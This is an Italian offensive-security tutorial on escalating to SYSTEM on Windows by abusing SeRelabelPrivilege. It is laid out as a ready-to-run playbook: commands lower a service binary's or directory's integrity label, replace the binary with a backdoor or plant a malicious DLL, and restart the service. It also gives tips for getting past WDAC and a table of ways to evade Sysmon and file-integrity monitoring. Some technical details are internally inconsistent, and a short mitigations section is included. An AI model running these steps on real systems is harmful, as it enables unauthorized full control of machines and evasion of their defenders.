---
title: 'SeRelabelPrivilege: Bypassare il MIC e Scrivere su File SYSTEM'
slug: serelabelprivilege
description: >-
  Scopri come usare SeRelabelPrivilege per abbassare il livello di integrità di
  file e directory, bypassare il Mandatory Integrity Control e ottenere una
  shell SYSTEM.
image: /SeRelabelPrivilege.webp
draft: false
date: 2026-06-24T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - serelabelprivilege
  - mandatory-integrity-control
---

Le ACL permettono la scrittura ma il layer MIC blocca il tuo processo Medium. Hai SeRelabelPrivilege. Un comando abbassa il label del file da High a Medium, il tuo processo scrive liberamente, sostituisci il binary del servizio SYSTEM. Due passaggi verso `nt authority\system`.

***

## Quick Exploit

```cmd
icacls "C:\Program Files\VendorApp\service.exe" | findstr Mandatory
icacls "C:\Program Files\VendorApp\service.exe" /setintegritylevel Medium
copy C:\temp\backdoor.exe "C:\Program Files\VendorApp\service.exe" /Y
sc stop NomeServizio && sc start NomeServizio
```

Output atteso:

```
nt authority\system
```

***

## Attack Chain

```
ACL permissiva ma MIC blocca scrittura (file a integrità High, processo Medium)
  → icacls [file] | findstr Mandatory → conferma livello High
  → icacls [file] /setintegritylevel Medium → abbassa il label
  → copy backdoor.exe → [file] → sc restart → SYSTEM
  OPPURE
  → icacls [directory] /setintegritylevel Medium
  → piazza DLL mancante → sc restart → SYSTEM
```

***

## Tool Decision

| Obiettivo                       | Comando                                                                    |
| ------------------------------- | -------------------------------------------------------------------------- |
| Abbassa label file              | `icacls [file] /setintegritylevel Medium`                                  |
| Abbassa label directory         | `icacls [dir] /setintegritylevel Medium`                                   |
| Abbassa label chiave registro   | `SetACL.exe -on [hive\key] -ot reg -actn setintegrity -integrity "Medium"` |
| Verifica livello processo       | `whoami /groups \| findstr Mandatory`                                      |
| Abbassa livello processo (test) | `NtObjectManager`: `Set-NtTokenIntegrityLevel -IntegrityLevel Low`         |

***

## Cos'è SeRelabelPrivilege e il Mandatory Integrity Control

Windows Mandatory Integrity Control (MIC) assegna livelli di integrità a ogni oggetto e processo:

| Livello | Valore | Contesto tipico          |
| :-----: | ------ | ------------------------ |
|   Low   | 0x1000 | Browser sandbox          |
|  Medium | 0x2000 | Processo utente standard |
|   High  | 0x3000 | Processo elevato (UAC)   |
|  System | 0x4000 | SYSTEM                   |

La regola "No Write Up": un processo non può scrivere su oggetti con livello di integrità superiore al proprio. SeRelabelPrivilege abbassa il label degli oggetti — rimuove questa protezione.

Questa è una barriera ortogonale alle ACL: un file può essere protetto sia da ACL che da MIC — sono due meccanismi indipendenti che richiedono bypass separati.

***

## Quando esiste

* **Administrators** (token elevato)
* **Account con policy custom** che include "Modify an object label"
* Relativamente raro come privilegio standalone su account di servizio

Verifica:

```cmd
whoami /priv
```

Cerchi:

```
SeRelabelPrivilege    Modify an object label    Enabled
```

Se vedi `Disabled` → token non elevato. Avvia processo elevato.

***

## Step 1 — Verifica il livello di integrità del file target

Controlla il livello corrente del binary che vuoi sovrascrivere:

```cmd
icacls "C:\Program Files\VendorApp\service.exe" | findstr Mandatory
```

Output:

```
Mandatory Label\High Mandatory Level
```

Questo significa che il tuo processo Medium non può scriverci — MIC blocca, indipendentemente dalle ACL.

Verifica il tuo livello di integrità corrente:

```cmd
whoami /groups | findstr "Mandatory"
```

Output tipico in token non elevato:

```
Mandatory Label\Medium Mandatory Level    Label    S-1-16-8192
```

***

## Step 2 — Abbassa il livello di integrità del file

```cmd
icacls "C:\Program Files\VendorApp\service.exe" /setintegritylevel Medium
```

Output:

```
processed file: C:\Program Files\VendorApp\service.exe
Successfully processed 1 files; Failed processing 0 files
```

Verifica che il label sia cambiato:

```cmd
icacls "C:\Program Files\VendorApp\service.exe" | findstr Mandatory
```

Output:

```
Mandatory Label\Medium Mandatory Level
```

***

## Step 3 — Sovrascrivi e ottieni SYSTEM

Ora il tuo processo Medium può scrivere sul file:

```cmd
copy C:\temp\backdoor.exe "C:\Program Files\VendorApp\service.exe" /Y
```

Riavvia il servizio:

```cmd
sc stop NomeServizio
```

```cmd
sc start NomeServizio
```

Output:

```
nt authority\system
```

***

## Varianti

### DLL Hijacking con label lowering

Se vuoi piazzare una DLL mancante in una directory con integrità High:

Prima abbassa il label della directory:

```cmd
icacls "C:\Program Files\VendorApp\" /setintegritylevel Medium
```

Poi copia la DLL:

```cmd
copy C:\temp\malicious.dll "C:\Program Files\VendorApp\missing.dll"
```

Riavvia il servizio:

```cmd
sc stop NomeServizio && sc start NomeServizio
```

### Abbassare il livello di integrità di un processo

Con NtObjectManager (James Forshaw) puoi abbassare il livello di integrità del token di un processo in esecuzione — utile per testare sandbox e isolamento:

```powershell
Install-Module NtObjectManager
Import-Module NtObjectManager
$token = Get-NtToken
Set-NtTokenIntegrityLevel -Token $token -IntegrityLevel Low
```

Source: [googleprojectzero/sandbox-attacksurface-analysis-tools](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools)

### Abbassare label di chiave di registro

Funziona anche sulle chiavi di registro, non solo sui file:

```cmd
icacls "HKLM\SYSTEM\CurrentControlSet\Services\NomeServizio" /setintegritylevel Medium
```

**Nota:** `icacls` non gestisce il registry direttamente — usa SetACL per le chiavi di registro:

```cmd
SetACL.exe -on "HKLM\SYSTEM\CurrentControlSet\Services\NomeServizio" -ot reg -actn setintegrity -integrity "Medium"
```

***

## Scenari reali

**Servizio SYSTEM con binary a integrità High, ACL non restrittive** — le ACL permetterebbero la scrittura, ma MIC blocca. SeRelabelPrivilege abbassa il label → scrittura possibile → binary sostituito → SYSTEM.

**DLL in directory con integrità High** — Process Monitor mostra che un servizio cerca una DLL in un path con label High. Con SeRelabelPrivilege abbasso il label della directory → piazzo la DLL → SYSTEM.

***

## Errori comuni

**`icacls /setintegritylevel` restituisce Access Denied** — Privilegio non Enabled nel token. Verifica: `whoami /priv | findstr SeRelabel`. Se Disabled, avvia processo elevato.

**File sovrascrive ma il servizio non parte** — WDAC blocca l'esecuzione del binary non firmato. Usa un loader LOLBin o un binary firmato come wrapper.

**File di System32 viene ripristinato dopo la scrittura** — WRP protegge il file. Usa directory dei servizi in `C:\Program Files\` invece.

**Il servizio non si avvia dopo il restart** — Controlla se il servizio ha permessi per eseguire il binary dal path: `sc sdshow NomeServizio`. Se l'account servizio non ha execute permission sul binary, aggiungila con `icacls`.

**DLL non viene caricata dopo il piazzamento** — Il servizio usa path assoluto nella chiamata LoadLibrary. Usa Process Monitor per verificare che cerchi effettivamente la DLL in quel path (filtra `NAME NOT FOUND` + `.dll`).

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                                       | Come lo bypassa il Red Team                                                                                 |
| -------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| `icacls /setintegritylevel` da contesti non standard           | Usa `NtObjectManager` PowerShell invece — stesso risultato, pattern diverso                                 |
| Sysmon 11 — FileCreate su directory servizi da processo Medium | Abbassa prima il label, poi scrivi — il FileCreate è comunque presente ma da processo medium, meno sospetto |
| FIM sui binary dei servizi                                     | Difficile evitare — usa DLL hijacking su file secondari meno monitorati rispetto al binary principale       |

***

## Quando fallisce

* Non puoi alzare label sopra il livello del tuo token — solo abbassare
* WRP su file System32 core → usa `C:\Program Files\`
* WDAC / AppLocker → blocca il binary sostituto
* Servizio non riavviabile → `sc sdshow NomeServizio`

***

## Mitigazioni

* **WDAC** — blocca esecuzione di binary non firmati anche se il label è stato abbassato
* FIM sui binary dei servizi critici
* Limitare SeRelabelPrivilege agli account strettamente necessari

**Nota realistica:** SeRelabelPrivilege è il bypass per gli scenari in cui MIC è l'unica barriera rimasta — quando le ACL permettono già la scrittura ma il processo Medium non può scrivere su oggetti High. Meno comune degli altri vettori, ma essenziale da conoscere per ambienti hardened.

***

## FAQ

**Differenza con SeRestorePrivilege?**
SeRestorePrivilege bypassa le ACL in scrittura direttamente. SeRelabelPrivilege abbassa il layer MIC. Barriere ortogonali — un file può bloccare la scrittura sia via ACL che via MIC, richiedono bypass separati.

**Posso alzare il label a System?**
No — non puoi alzare sopra il livello del tuo token. Token Medium → massimo Medium. Token High → massimo High.

**Quando è più utile di SeRestorePrivilege?**
Quando le ACL permettono già la scrittura ma il MIC la blocca — situazione meno comune ma presente in ambienti con hardening parziale.

***

SeRelabelPrivilege è il bypass specifico per il layer MIC — indispensabile quando le ACL sono permissive ma il livello di integrità è l'unica barriera rimasta.

***

**Articoli correlati:**

* [SeRestorePrivilege](https://hackita.it/articoli/serestoreprivilege) — bypass ACL diretto, un passo
* [SeTakeOwnershipPrivilege](https://hackita.it/articoli/setakeownershipprivilege) — bypass ownership + ACL

**Riferimenti:** [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) · [Microsoft Docs MIC](https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/modify-an-object-label)
